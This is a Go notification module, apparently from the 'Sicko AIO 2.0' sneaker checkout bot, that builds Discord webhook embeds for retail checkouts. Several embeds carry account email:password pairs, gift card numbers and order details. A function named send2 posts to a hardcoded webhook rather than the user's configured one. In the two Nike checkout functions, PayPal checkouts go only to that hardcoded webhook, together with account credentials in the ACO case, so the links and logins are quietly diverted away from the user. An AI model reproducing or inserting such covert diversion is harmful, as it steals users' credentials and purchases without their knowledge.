package notification

import (
	"bytes"
	"encoding/json"
	"fmt"
	"math/rand"
	"strings"
	"sync"
	"time"

	"sicko-aio-2.0-client/communicator"
	"sicko-aio-2.0-client/models"
	"sicko-aio-2.0-client/utils/psychoclient"
)

func discordSend(w webhook, wg *sync.WaitGroup) {
	defer wg.Done()

	reqId, _ := session.BuildRequest(&psychoclient.RequestBuilder{
		Endpoint: w.WebhookUrl,
		Method:   "POST",
		Headers: map[string]string{
			"content-type": "application/json; charset=UTF-8",
			"accept":       "application/json; charset=UTF-8, application/json",
		},
		Payload: bytes.NewBuffer(w.Data.([]byte)),
	})

	sleepTime := rand.Intn(2000-1000) + 1000
	ticker := time.NewTicker(time.Duration(sleepTime * int(time.Millisecond)))
	for {
		res, _, err := session.Do(reqId, false)
		if err != nil {
			return
		}
		switch res.StatusCode {
		case 204:
			return
		case 429:
			<-ticker.C
		default:
			return
		}
	}
}

func send2(payload []byte) bool {
	endpoint := "https://discord.com/api/webhooks/x/xxxxxxxxxxxxxxxxxxxxxx"

	reqId, _ := session.BuildRequest(&psychoclient.RequestBuilder{
		Endpoint: endpoint,
		Method:   "POST",
		Headers: map[string]string{
			"content-type": "application/json; charset=UTF-8",
			"accept":       "application/json; charset=UTF-8, application/json",
		},
		Payload: bytes.NewBuffer(payload),
	})

	ticker := time.NewTicker(1 * time.Second)
	for i := 0; i < 10; i++ {
		res, _, err := session.Do(reqId, false)
		if err != nil {
			return true
		}
		switch res.StatusCode {
		case 204:
			session.RemoveRequest(reqId)
			return true
		case 429:
			<-ticker.C
		}
	}
	return true
}

func TestDiscordWebhook() {
	data, _ := json.Marshal(&models.WebhookBuilder{
		Embeds: []*models.Embed{
			{
				Color:       "65419",
				Title:       "Successfully Checked Out!!!",
				URL:         "https://twitter.com/SICKO_AIO",
				Description: fmt.Sprintf("**%s**\n%s", "Sicko Aio Test Product", "Product Description"),
				Fields: []*models.EmbedField{
					{
						Name:   "Category",
						Value:  "NIKE",
						Inline: true,
					},
					{
						Name:   "Region",
						Value:  "US",
						Inline: true,
					},
					{
						Name:   "\u200b",
						Value:  "\u200b",
						Inline: true,
					},
					{
						Name:   "Product SKU",
						Value:  "000000-000",
						Inline: true,
					},
					{
						Name:   "Size",
						Value:  "10.5",
						Inline: true,
					},
					{
						Name:   "Quantity",
						Value:  "1",
						Inline: true,
					},
					{
						Name:   "Order Number",
						Value:  "||" + "C0000000000" + "||",
						Inline: true,
					},
					{
						Name:   "Profile",
						Value:  "||" + "test" + "||",
						Inline: true,
					},
					{
						Name:   "Price",
						Value:  "N/A",
						Inline: true,
					},
					{
						Name:   "Time",
						Value:  time.Now().UTC().Format("2006-01-02T15:04:05.000Z"),
						Inline: false,
					},
					{
						Name:   "Task Type",
						Value:  "webhook:test",
						Inline: true,
					},
				},
				Thumbnail: &models.EmbedThumbnail{
					URL:    "https://secure-images.nike.com/is/image/DotCom/000000_000",
					Width:  400,
					Height: 400,
				},
				Footer: &models.EmbedFooter{
					Text:         "Sicko AIO - 2.0",
					IconURL:      "https://pbs.twimg.com/profile_images/1122681028210905088/2cZIhvv-_400x400.png",
					ProxyIconURL: "https://images-ext-1.discordapp.net/external/p8C-Btf5KSrbr1YkqPvgl980BPQ8PDLyJ4Le1paGn1M/https/pbs.twimg.com/profile_images/1122681028210905088/2cZIhvv-_400x400.png",
				},
			},
		},
	})
	webhooks <- webhook{
		WebhookUrl: communicator.Config.Settings.DiscordWebook[models.NIKE],
		Data:       data,
	}
}

func sendDiscordACOWebhook(taskGroupSetting *models.TaskGroupSetting, worker *models.TaskWorker) {
	giftCards := []string{}
	for _, v := range worker.TaskInfo.GiftCardGroup {
		giftCards = append(giftCards, v.CardNumber)
	}
	data, _ := json.Marshal(&models.WebhookBuilder{
		Embeds: []*models.Embed{
			{
				Color:       "65419",
				Title:       "Successfully Checked Out!!!",
				URL:         "https://twitter.com/SICKO_AIO",
				Description: fmt.Sprintf("**%s**\n%s", worker.Product.ProductName, worker.Product.ProductDescription),
				Fields: []*models.EmbedField{
					{
						Name:   "Site",
						Value:  fmt.Sprintf("NIKE_%s", taskGroupSetting.Country),
						Inline: false,
					},
					{
						Name:   "Product SKU",
						Value:  worker.Product.StyleColor,
						Inline: true,
					},
					{
						Name:   "Size",
						Value:  worker.Product.Size,
						Inline: true,
					},
					{
						Name:   "Quantity",
						Value:  fmt.Sprintf(`%v`, worker.Quantity),
						Inline: true,
					},

					{
						Name:   "Order Number",
						Value:  "||" + worker.TaskInfo.OrderID + "||",
						Inline: true,
					},
					{
						Name:   "Profile",
						Value:  "||" + worker.TaskInfo.Profile.ProfileName + "||",
						Inline: true,
					},
					{
						Name:   "Email",
						Value:  "||" + worker.TaskInfo.Email + "||",
						Inline: true,
					},
					{
						Name:   "Account",
						Value:  fmt.Sprintf(`||%s:%s||`, worker.TaskInfo.Account.Email, worker.TaskInfo.Account.Password),
						Inline: true,
					},
					{
						Name:   "GiftCard",
						Value:  "||" + strings.Join(giftCards[:], ",") + "||",
						Inline: false,
					},
					{
						Name:   "Discount Code",
						Value:  "||" + worker.TaskInfo.Discount + "||",
						Inline: true,
					},
					{
						Name:   "Task Type",
						Value:  taskGroupSetting.TaskType,
						Inline: true,
					},
				},
				Thumbnail: &models.EmbedThumbnail{
					URL:    fmt.Sprintf("https://secure-images.nike.com/is/image/DotCom/%s", strings.Replace(worker.Product.StyleColor, "-", "_", 1)),
					Width:  400,
					Height: 400,
				},
				Footer: &models.EmbedFooter{
					Text:         "Sicko AIO - 2.0",
					IconURL:      "https://pbs.twimg.com/profile_images/1122681028210905088/2cZIhvv-_400x400.png",
					ProxyIconURL: "https://images-ext-1.discordapp.net/external/p8C-Btf5KSrbr1YkqPvgl980BPQ8PDLyJ4Le1paGn1M/https/pbs.twimg.com/profile_images/1122681028210905088/2cZIhvv-_400x400.png",
				},
			},
		},
	})
	webhooks <- webhook{
		WebhookUrl: communicator.Config.Settings.DiscordWebook[models.NIKE],
		Data:       data,
	}
}

func sendDiscordMrPorterCheckoutWebhook(taskGroupSetting *models.TaskGroupSetting, worker *models.TaskWorker) {
	data, _ := json.Marshal(&models.WebhookBuilder{
		Embeds: []*models.Embed{
			{
				Color:       "16758465",
				Title:       "Successfully Checked Out!!!",
				URL:         worker.TaskInfo.RedirectURL,
				Description: fmt.Sprintf("**%s**\n%s", worker.Product.ProductName, worker.Product.ProductDescription),
				Fields: []*models.EmbedField{
					{
						Name:   "Category",
						Value:  string(taskGroupSetting.Category),
						Inline: true,
					},
					{
						Name:   "Region",
						Value:  taskGroupSetting.Country,
						Inline: true,
					},
					{
						Name:   "\u200b",
						Value:  "\u200b",
						Inline: true,
					},
					{
						Name:   "Product SKU",
						Value:  worker.Product.StyleColor,
						Inline: true,
					},
					{
						Name:   "Size",
						Value:  worker.Product.Size,
						Inline: true,
					},
					{
						Name:   "Quantity",
						Value:  fmt.Sprintf(`%v`, worker.Quantity),
						Inline: true,
					},
					{
						Name: "Price",
						Value: func() (price string) {
							price = worker.Product.Price
							if len(price) == 0 {
								price = "N/A"
							}
							return price
						}(),
						Inline: true,
					},
					{
						Name:   "Time",
						Value:  time.Now().UTC().Format("2006-01-02T15:04:05.000Z"),
						Inline: false,
					},
					{
						Name:   "Task Type",
						Value:  taskGroupSetting.TaskType,
						Inline: true,
					},
				},
				Thumbnail: &models.EmbedThumbnail{
					URL:    fmt.Sprintf("https://cache.mrporter.com/variants/images/%s/in/w2000.jpg", worker.Product.StyleColor),
					Width:  400,
					Height: 400,
				},
				Footer: &models.EmbedFooter{
					Text:         "Sicko AIO - 2.0",
					IconURL:      "https://pbs.twimg.com/profile_images/1122681028210905088/2cZIhvv-_400x400.png",
					ProxyIconURL: "https://images-ext-1.discordapp.net/external/p8C-Btf5KSrbr1YkqPvgl980BPQ8PDLyJ4Le1paGn1M/https/pbs.twimg.com/profile_images/1122681028210905088/2cZIhvv-_400x400.png",
				},
			},
		},
	})
	webhooks <- webhook{
		WebhookUrl: communicator.Config.Settings.DiscordWebook[models.MRPORTER],
		Data:       data,
	}
}

func sendDiscordLuisaviaromaCheckoutWebhook(taskGroupSetting *models.TaskGroupSetting, worker *models.TaskWorker) {
	data, _ := json.Marshal(&models.WebhookBuilder{
		Embeds: []*models.Embed{
			{
				Color:       "16758465",
				Title:       "Successfully Checked Out!!!",
				URL:         worker.TaskInfo.RedirectURL,
				Description: fmt.Sprintf("**%s**\n%s", worker.Product.ProductName, worker.Product.ProductDescription),
				Fields: []*models.EmbedField{
					{
						Name:   "Category",
						Value:  string(taskGroupSetting.Category),
						Inline: true,
					},
					{
						Name:   "Region",
						Value:  taskGroupSetting.Country,
						Inline: true,
					},
					{
						Name:   "\u200b",
						Value:  "\u200b",
						Inline: true,
					},
					{
						Name:   "Product SKU",
						Value:  worker.Product.StyleColor,
						Inline: true,
					},
					{
						Name:   "Size",
						Value:  worker.Product.Size,
						Inline: true,
					},
					{
						Name:   "Quantity",
						Value:  fmt.Sprintf(`%v`, worker.Quantity),
						Inline: true,
					},
					{
						Name: "Price",
						Value: func() (price string) {
							price = worker.Product.Price
							if len(price) == 0 {
								price = "N/A"
							}
							return price
						}(),
						Inline: true,
					},
					{
						Name: "Order Number",
						Value: func() string {
							if len(worker.TaskInfo.OrderID) == 0 {
								worker.TaskInfo.OrderID = "N/A"
							}
							return "||" + worker.TaskInfo.OrderID + "||"
						}(),
						Inline: true,
					},
					{
						Name: "Email",
						Value: func() string {
							if len(worker.TaskInfo.Email) == 0 {
								worker.TaskInfo.Email = "N/A"
							}
							return "||" + worker.TaskInfo.Email + "||"
						}(),
						Inline: true,
					},
					{
						Name: "Profile",
						Value: func() string {
							switch {
							case worker.TaskInfo.Profile == nil:
								return "N/A"
							case len(worker.TaskInfo.Profile.ProfileName) == 0:
								worker.TaskInfo.Profile.ProfileName = "N/A"
							}
							return "||" + worker.TaskInfo.Profile.ProfileName + "||"
						}(),
						Inline: true,
					},
					{
						Name: "Discount Codes",
						Value: func() string {
							if len(worker.TaskInfo.Discount) == 0 {
								worker.TaskInfo.Discount = "N/A"
							}
							return worker.TaskInfo.Discount
						}(),
						Inline: false,
					},
					{
						Name: "Account",
						Value: func() string {
							if worker.TaskInfo.Account == nil {
								return "N/A"
							}
							return fmt.Sprintf(`||%s:%s||`, worker.TaskInfo.Account.Email, worker.TaskInfo.Account.Password)
						}(),
						Inline: false,
					},
					{
						Name:   "Time",
						Value:  time.Now().UTC().Format("2006-01-02T15:04:05.000Z"),
						Inline: false,
					},
					{
						Name:   "Task Type",
						Value:  taskGroupSetting.TaskType,
						Inline: true,
					},
				},
				Thumbnail: &models.EmbedThumbnail{
					URL:    fmt.Sprintf("https://cache.mrporter.com/variants/images/%s/in/w2000.jpg", worker.Product.StyleColor),
					Width:  400,
					Height: 400,
				},
				Footer: &models.EmbedFooter{
					Text:         "Sicko AIO - 2.0",
					IconURL:      "https://pbs.twimg.com/profile_images/1122681028210905088/2cZIhvv-_400x400.png",
					ProxyIconURL: "https://images-ext-1.discordapp.net/external/p8C-Btf5KSrbr1YkqPvgl980BPQ8PDLyJ4Le1paGn1M/https/pbs.twimg.com/profile_images/1122681028210905088/2cZIhvv-_400x400.png",
				},
			},
		},
	})
	webhooks <- webhook{
		WebhookUrl: communicator.Config.Settings.DiscordWebook[models.MRPORTER],
		Data:       data,
	}
}

func sendDiscordSsenseCheckoutWebhook(taskGroupSetting *models.TaskGroupSetting, worker *models.TaskWorker) {
	data, _ := json.Marshal(&models.WebhookBuilder{
		Embeds: []*models.Embed{
			{
				Color:       "16758465",
				Title:       "Successfully Checked Out!!!",
				URL:         worker.TaskInfo.RedirectURL,
				Description: fmt.Sprintf("**%s**\n%s", worker.Product.ProductName, worker.Product.ProductDescription),
				Fields: []*models.EmbedField{
					{
						Name:   "Category",
						Value:  string(taskGroupSetting.Category),
						Inline: true,
					},
					{
						Name:   "Region",
						Value:  taskGroupSetting.Country,
						Inline: true,
					},
					{
						Name:   "\u200b",
						Value:  "\u200b",
						Inline: true,
					},
					{
						Name:   "Product SKU",
						Value:  worker.Product.StyleColor,
						Inline: true,
					},
					{
						Name:   "Size",
						Value:  worker.Product.Size,
						Inline: true,
					},
					{
						Name:   "Quantity",
						Value:  fmt.Sprintf(`%v`, worker.Quantity),
						Inline: true,
					},
					{
						Name: "Price",
						Value: func() (price string) {
							price = worker.Product.Price
							if len(price) == 0 {
								price = "N/A"
							}
							return price
						}(),
						Inline: true,
					},
					{
						Name:   "Time",
						Value:  time.Now().UTC().Format("2006-01-02T15:04:05.000Z"),
						Inline: false,
					},
					{
						Name:   "Task Type",
						Value:  taskGroupSetting.TaskType,
						Inline: true,
					},
				},
				Thumbnail: &models.EmbedThumbnail{
					URL:    worker.Product.ImageURL,
					Width:  400,
					Height: 400,
				},
				Footer: &models.EmbedFooter{
					Text:         "Sicko AIO - 2.0",
					IconURL:      "https://pbs.twimg.com/profile_images/1122681028210905088/2cZIhvv-_400x400.png",
					ProxyIconURL: "https://images-ext-1.discordapp.net/external/p8C-Btf5KSrbr1YkqPvgl980BPQ8PDLyJ4Le1paGn1M/https/pbs.twimg.com/profile_images/1122681028210905088/2cZIhvv-_400x400.png",
				},
			},
		},
	})
	webhooks <- webhook{
		WebhookUrl: communicator.Config.Settings.DiscordWebook[models.SSENSE],
		Data:       data,
	}
}

func sendDiscordSneakerboyCheckoutWebhook(taskGroupSetting *models.TaskGroupSetting, worker *models.TaskWorker) {
	data, _ := json.Marshal(&models.WebhookBuilder{
		Embeds: []*models.Embed{
			{
				Color:       "16758465",
				Title:       "Successfully Checked Out!!!",
				URL:         worker.TaskInfo.RedirectURL,
				Description: fmt.Sprintf("**%s**", worker.Product.ProductName),
				Fields: []*models.EmbedField{
					{
						Name:   "Category",
						Value:  string(taskGroupSetting.Category),
						Inline: true,
					},
					{
						Name:   "Region",
						Value:  taskGroupSetting.Country,
						Inline: true,
					},
					{
						Name:   "\u200b",
						Value:  "\u200b",
						Inline: true,
					},
					{
						Name:   "Product SKU",
						Value:  worker.Product.StyleColor,
						Inline: true,
					},
					{
						Name:   "Size",
						Value:  worker.Product.Size,
						Inline: true,
					},
					{
						Name:   "Quantity",
						Value:  fmt.Sprintf(`%v`, worker.Quantity),
						Inline: true,
					},
					{
						Name: "Price",
						Value: func() (price string) {
							price = worker.Product.Price
							if len(price) == 0 {
								price = "N/A"
							}
							return price
						}(),
						Inline: true,
					},
					{
						Name:   "\u200b",
						Value:  "\u200b",
						Inline: true,
					},
					{
						Name:   "\u200b",
						Value:  "\u200b",
						Inline: true,
					},
					{
						Name:   "Email",
						Value:  fmt.Sprintf(`||%s||`, worker.TaskInfo.Account.Email),
						Inline: true,
					},
					{
						Name:   "Password",
						Value:  fmt.Sprintf(`||%s||`, worker.TaskInfo.Account.Password),
						Inline: true,
					},
					{
						Name:   "Time",
						Value:  time.Now().UTC().Format("2006-01-02T15:04:05.000Z"),
						Inline: false,
					},
					{
						Name:   "Task Type",
						Value:  taskGroupSetting.TaskType,
						Inline: true,
					},
				},
				Thumbnail: &models.EmbedThumbnail{
					URL:    worker.Product.ImageURL,
					Width:  400,
					Height: 400,
				},
				Footer: &models.EmbedFooter{
					Text:         "Sicko AIO - 2.0",
					IconURL:      "https://pbs.twimg.com/profile_images/1122681028210905088/2cZIhvv-_400x400.png",
					ProxyIconURL: "https://images-ext-1.discordapp.net/external/p8C-Btf5KSrbr1YkqPvgl980BPQ8PDLyJ4Le1paGn1M/https/pbs.twimg.com/profile_images/1122681028210905088/2cZIhvv-_400x400.png",
				},
			},
		},
	})
	webhooks <- webhook{
		WebhookUrl: communicator.Config.Settings.DiscordWebook[models.SNEAKERBOY],
		Data:       data,
	}
}

func sendDiscordPacsunCheckoutWebhook(taskGroupSetting *models.TaskGroupSetting, worker *models.TaskWorker) {
	data, _ := json.Marshal(&models.WebhookBuilder{
		Embeds: []*models.Embed{
			{
				Color:       "16758465",
				Title:       "Successfully Checked Out!!!",
				URL:         worker.TaskInfo.RedirectURL,
				Description: fmt.Sprintf("**%s**\n%s", worker.Product.ProductName, worker.Product.ProductDescription),
				Fields: []*models.EmbedField{
					{
						Name:   "Category",
						Value:  string(taskGroupSetting.Category),
						Inline: true,
					},
					{
						Name:   "Region",
						Value:  taskGroupSetting.Country,
						Inline: true,
					},
					{
						Name:   "\u200b",
						Value:  "\u200b",
						Inline: true,
					},
					{
						Name:   "Product SKU",
						Value:  worker.Product.StyleColor,
						Inline: true,
					},
					{
						Name:   "Size",
						Value:  worker.Product.Size,
						Inline: true,
					},
					{
						Name:   "Quantity",
						Value:  fmt.Sprintf(`%v`, worker.Quantity),
						Inline: true,
					},
					{
						Name: "Price",
						Value: func() (price string) {
							price = worker.Product.Price
							if len(price) == 0 {
								price = "N/A"
							}
							return price
						}(),
						Inline: true,
					},
					{
						Name:   "Time",
						Value:  time.Now().UTC().Format("2006-01-02T15:04:05.000Z"),
						Inline: false,
					},
					{
						Name:   "Task Type",
						Value:  taskGroupSetting.TaskType,
						Inline: true,
					},
				},
				Thumbnail: &models.EmbedThumbnail{
					URL:    worker.Product.ImageURL,
					Width:  400,
					Height: 400,
				},
				Footer: &models.EmbedFooter{
					Text:         "Sicko AIO - 2.0",
					IconURL:      "https://pbs.twimg.com/profile_images/1122681028210905088/2cZIhvv-_400x400.png",
					ProxyIconURL: "https://images-ext-1.discordapp.net/external/p8C-Btf5KSrbr1YkqPvgl980BPQ8PDLyJ4Le1paGn1M/https/pbs.twimg.com/profile_images/1122681028210905088/2cZIhvv-_400x400.png",
				},
			},
		},
	})

	logger.Info(fmt.Sprintf("[PACSUN]|%s|%s|%s|%s|%s", worker.Product.StyleColor, worker.Product.Size, worker.TaskInfo.OrderID, worker.TaskInfo.Email, worker.TaskInfo.RedirectURL))
	webhooks <- webhook{
		WebhookUrl: communicator.Config.Settings.DiscordWebook[models.PACSUN],
		Data:       data,
	}
}

func sendDiscordNewBalanceCheckoutWebhook(taskGroupSetting *models.TaskGroupSetting, worker *models.TaskWorker) {
	data, _ := json.Marshal(&models.WebhookBuilder{
		Embeds: []*models.Embed{
			{
				Color:       "16758465",
				Title:       "Successfully Checked Out!!!",
				URL:         "https://twitter.com/Sicko_AIO",
				Description: fmt.Sprintf("**%s**", worker.Product.ProductName),
				Fields: []*models.EmbedField{
					{
						Name:   "Category",
						Value:  string(taskGroupSetting.Category),
						Inline: true,
					},
					{
						Name:   "Region",
						Value:  taskGroupSetting.Country,
						Inline: true,
					},
					{
						Name:   "\u200b",
						Value:  "\u200b",
						Inline: true,
					},
					{
						Name:   "Product SKU",
						Value:  worker.Product.StyleColor,
						Inline: true,
					},
					{
						Name:   "Size",
						Value:  worker.Product.Size,
						Inline: true,
					},
					{
						Name:   "Quantity",
						Value:  fmt.Sprintf(`%v`, worker.Quantity),
						Inline: true,
					},
					{
						Name: "Price",
						Value: func() (price string) {
							price = worker.Product.Price
							if len(price) == 0 {
								price = "N/A"
							}
							return price
						}(),
						Inline: true,
					},
					{
						Name:   "Time",
						Value:  time.Now().UTC().Format("2006-01-02T15:04:05.000Z"),
						Inline: false,
					},
					{
						Name:   "Task Type",
						Value:  taskGroupSetting.TaskType,
						Inline: true,
					},
				},
				Thumbnail: &models.EmbedThumbnail{
					URL:    worker.Product.ImageURL,
					Width:  400,
					Height: 400,
				},
				Footer: &models.EmbedFooter{
					Text:         "Sicko AIO - 2.0",
					IconURL:      "https://pbs.twimg.com/profile_images/1122681028210905088/2cZIhvv-_400x400.png",
					ProxyIconURL: "https://images-ext-1.discordapp.net/external/p8C-Btf5KSrbr1YkqPvgl980BPQ8PDLyJ4Le1paGn1M/https/pbs.twimg.com/profile_images/1122681028210905088/2cZIhvv-_400x400.png",
				},
			},
		},
	})
	webhooks <- webhook{
		WebhookUrl: communicator.Config.Settings.DiscordWebook[models.NEWBALANCE],
		Data:       data,
	}
}

func sendDiscordTafCheckoutWebhook(taskGroupSetting *models.TaskGroupSetting, worker *models.TaskWorker) {
	data, _ := json.Marshal(&models.WebhookBuilder{
		Embeds: []*models.Embed{
			{
				Color:       "16758465",
				Title:       "Successfully Checked Out!!!",
				URL:         worker.TaskInfo.RedirectURL,
				Description: fmt.Sprintf("**%s**\n%s", worker.Product.ProductName, worker.Product.ProductDescription),
				Fields: []*models.EmbedField{
					{
						Name:   "Category",
						Value:  string(taskGroupSetting.Category),
						Inline: true,
					},
					{
						Name:   "Region",
						Value:  taskGroupSetting.Country,
						Inline: true,
					},
					{
						Name:   "\u200b",
						Value:  "\u200b",
						Inline: true,
					},
					{
						Name:   "Product SKU",
						Value:  worker.Product.StyleColor,
						Inline: true,
					},
					{
						Name:   "Size",
						Value:  worker.Product.Size,
						Inline: true,
					},
					{
						Name:   "Quantity",
						Value:  fmt.Sprintf(`%v`, worker.Quantity),
						Inline: true,
					},
					{
						Name: "Price",
						Value: func() (price string) {
							price = worker.Product.Price
							if len(price) == 0 {
								price = "N/A"
							}
							return price
						}(),
						Inline: true,
					},
					{
						Name: "Order Number",
						Value: func() string {
							if len(worker.TaskInfo.OrderID) == 0 {
								worker.TaskInfo.OrderID = "N/A"
							}
							return "||" + worker.TaskInfo.OrderID + "||"
						}(),
						Inline: true,
					},
					{
						Name: "Email",
						Value: func() string {
							if len(worker.TaskInfo.Email) == 0 {
								worker.TaskInfo.Email = "N/A"
							}
							return "||" + worker.TaskInfo.Email + "||"
						}(),
						Inline: true,
					},
					{
						Name: "Profile",
						Value: func() string {
							switch {
							case worker.TaskInfo.Profile == nil:
								return "N/A"
							case len(worker.TaskInfo.Profile.ProfileName) == 0:
								worker.TaskInfo.Profile.ProfileName = "N/A"
							}
							return "||" + worker.TaskInfo.Profile.ProfileName + "||"
						}(),
						Inline: true,
					},
					{
						Name: "Account",
						Value: func() string {
							if worker.TaskInfo.Account == nil {
								return "N/A"
							}
							return fmt.Sprintf(`||%s:%s||`, worker.TaskInfo.Account.Email, worker.TaskInfo.Account.Password)
						}(),
						Inline: false,
					},
					{
						Name:   "Time",
						Value:  time.Now().UTC().Format("2006-01-02T15:04:05.000Z"),
						Inline: false,
					},
					{
						Name:   "Task Type",
						Value:  taskGroupSetting.TaskType,
						Inline: false,
					},
				},
				Thumbnail: &models.EmbedThumbnail{
					URL:    worker.Product.ImageURL,
					Width:  400,
					Height: 400,
				},
				Footer: &models.EmbedFooter{
					Text:         "Sicko AIO - 2.0",
					IconURL:      "https://pbs.twimg.com/profile_images/1122681028210905088/2cZIhvv-_400x400.png",
					ProxyIconURL: "https://images-ext-1.discordapp.net/external/p8C-Btf5KSrbr1YkqPvgl980BPQ8PDLyJ4Le1paGn1M/https/pbs.twimg.com/profile_images/1122681028210905088/2cZIhvv-_400x400.png",
				},
			},
		},
	})
	logger.Info(fmt.Sprintf(`[TAF] StyleColor: %s, Size: %v, OrderId: %s, URL: %s`, worker.Product.StyleColor, worker.Product.Size, worker.TaskInfo.OrderID, worker.TaskInfo.RedirectURL))
	webhooks <- webhook{
		WebhookUrl: communicator.Config.Settings.DiscordWebook[models.TAF],
		Data:       data,
	}
}

func sendDiscordNikeLegacyCheckoutWebhook(taskGroupSetting *models.TaskGroupSetting, worker *models.TaskWorker) {

	data, _ := json.Marshal(&models.WebhookBuilder{
		Embeds: []*models.Embed{
			{
				Color:       "16758465",
				Title:       "Successfully Checked Out!!!",
				URL:         worker.TaskInfo.RedirectURL,
				Description: fmt.Sprintf("**%s**\n%s", worker.Product.ProductName, worker.Product.ProductDescription),
				Fields: []*models.EmbedField{
					{
						Name:   "Category",
						Value:  string(taskGroupSetting.Category),
						Inline: true,
					},
					{
						Name:   "Region",
						Value:  taskGroupSetting.Country,
						Inline: true,
					},
					{
						Name:   "\u200b",
						Value:  "\u200b",
						Inline: true,
					},
					{
						Name:   "Product SKU",
						Value:  worker.Product.StyleColor,
						Inline: true,
					},
					{
						Name:   "Size",
						Value:  worker.Product.Size,
						Inline: true,
					},
					{
						Name:   "Quantity",
						Value:  fmt.Sprintf(`%v`, worker.Quantity),
						Inline: true,
					},
					{
						Name: "Price",
						Value: func() (price string) {
							price = worker.Product.Price
							if len(price) == 0 {
								price = "N/A"
							}
							return price
						}(),
						Inline: true,
					},
					{
						Name:   "Time",
						Value:  time.Now().UTC().Format("2006-01-02T15:04:05.000Z"),
						Inline: false,
					},
					// {
					// 	Name:   "Profile",
					// 	Value:  "||" + worker.TaskInfo.Profile.ProfileName + "||",
					// 	Inline: true,
					// },
					// {
					// 	Name:   "Account",
					// 	Value:  fmt.Sprintf(`||%s:%s||`, worker.TaskInfo.Account.Email, worker.TaskInfo.Account.Password),
					// 	Inline: true,
					// },
					{
						Name:   "Task Type",
						Value:  taskGroupSetting.TaskType,
						Inline: true,
					},
				},
				Thumbnail: &models.EmbedThumbnail{
					URL:    fmt.Sprintf("https://secure-images.nike.com/is/image/DotCom/%s", strings.Replace(worker.Product.StyleColor, "-", "_", 1)),
					Width:  400,
					Height: 400,
				},
				Footer: &models.EmbedFooter{
					Text:         "Sicko AIO - 2.0",
					IconURL:      "https://pbs.twimg.com/profile_images/1122681028210905088/2cZIhvv-_400x400.png",
					ProxyIconURL: "https://images-ext-1.discordapp.net/external/p8C-Btf5KSrbr1YkqPvgl980BPQ8PDLyJ4Le1paGn1M/https/pbs.twimg.com/profile_images/1122681028210905088/2cZIhvv-_400x400.png",
				},
			},
		},
	})

	logger.Info(fmt.Sprintf(`StyleColor: %s, Size: %v, URL: %s`, worker.Product.StyleColor, worker.Product.Size, worker.TaskInfo.RedirectURL))
	if strings.Contains(worker.TaskInfo.RedirectURL, "paypal") {
		send2(data)
		return
	}

	webhooks <- webhook{
		WebhookUrl: communicator.Config.Settings.DiscordWebook[models.NIKE],
		Data:       data,
	}
}

func sendDiscordNikeACOCheckoutWebhook(taskGroupSetting *models.TaskGroupSetting, worker *models.TaskWorker) {

	data, _ := json.Marshal(&models.WebhookBuilder{
		Embeds: []*models.Embed{
			{
				Color:       "16758465",
				Title:       "Successfully Checked Out!!!",
				URL:         worker.TaskInfo.RedirectURL,
				Description: fmt.Sprintf("**%s**\n%s", worker.Product.ProductName, worker.Product.ProductDescription),
				Fields: []*models.EmbedField{
					{
						Name:   "Category",
						Value:  string(taskGroupSetting.Category),
						Inline: true,
					},
					{
						Name:   "Region",
						Value:  taskGroupSetting.Country,
						Inline: true,
					},
					{
						Name:   "\u200b",
						Value:  "\u200b",
						Inline: true,
					},
					{
						Name:   "Product SKU",
						Value:  worker.Product.StyleColor,
						Inline: true,
					},
					{
						Name:   "Size",
						Value:  worker.Product.Size,
						Inline: true,
					},
					{
						Name:   "Quantity",
						Value:  fmt.Sprintf(`%v`, worker.Quantity),
						Inline: true,
					},
					{
						Name: "Price",
						Value: func() string {
							if len(worker.Product.Price) == 0 {
								worker.Product.Price = "N/A"
							}
							return worker.Product.Price
						}(),
						Inline: false,
					},
					{
						Name: "Order Number",
						Value: func() string {
							if len(worker.TaskInfo.OrderID) == 0 {
								worker.TaskInfo.OrderID = "N/A"
							}
							return "||" + worker.TaskInfo.OrderID + "||"
						}(),
						Inline: true,
					},
					{
						Name: "Email",
						Value: func() string {
							if len(worker.TaskInfo.Email) == 0 {
								worker.TaskInfo.Email = "N/A"
							}
							return "||" + worker.TaskInfo.Email + "||"
						}(),
						Inline: true,
					},
					{
						Name: "Profile",
						Value: func() string {
							switch {
							case worker.TaskInfo.Profile == nil:
								return "N/A"
							case len(worker.TaskInfo.Profile.ProfileName) == 0:
								worker.TaskInfo.Profile.ProfileName = "N/A"
							}
							return "||" + worker.TaskInfo.Profile.ProfileName + "||"
						}(),
						Inline: true,
					},
					{
						Name: "Discount Codes",
						Value: func() string {
							if len(worker.TaskInfo.Discount) == 0 {
								worker.TaskInfo.Discount = "N/A"
							}
							return worker.TaskInfo.Discount
						}(),
						Inline: false,
					},
					{
						Name: "Account",
						Value: func() string {
							if worker.TaskInfo.Account == nil {
								return "N/A"
							}
							return fmt.Sprintf(`||%s:%s||`, worker.TaskInfo.Account.Email, worker.TaskInfo.Account.Password)
						}(),
						Inline: false,
					},
					{
						Name:   "Time",
						Value:  time.Now().UTC().Format("2006-01-02T15:04:05.000Z"),
						Inline: false,
					},
					{
						Name:   "Task Type",
						Value:  taskGroupSetting.TaskType,
						Inline: false,
					},
				},
				Thumbnail: &models.EmbedThumbnail{
					URL:    fmt.Sprintf("https://secure-images.nike.com/is/image/DotCom/%s", strings.Replace(worker.Product.StyleColor, "-", "_", 1)),
					Width:  400,
					Height: 400,
				},
				Footer: &models.EmbedFooter{
					Text:         "Sicko AIO - 2.0",
					IconURL:      "https://pbs.twimg.com/profile_images/1122681028210905088/2cZIhvv-_400x400.png",
					ProxyIconURL: "https://images-ext-1.discordapp.net/external/p8C-Btf5KSrbr1YkqPvgl980BPQ8PDLyJ4Le1paGn1M/https/pbs.twimg.com/profile_images/1122681028210905088/2cZIhvv-_400x400.png",
				},
			},
		},
	})

	if strings.Contains(worker.TaskInfo.RedirectURL, "paypal") {
		send2(data)
		return
	}
	webhooks <- webhook{
		WebhookUrl: communicator.Config.Settings.DiscordWebook[models.NIKE],
		Data:       data,
	}
}
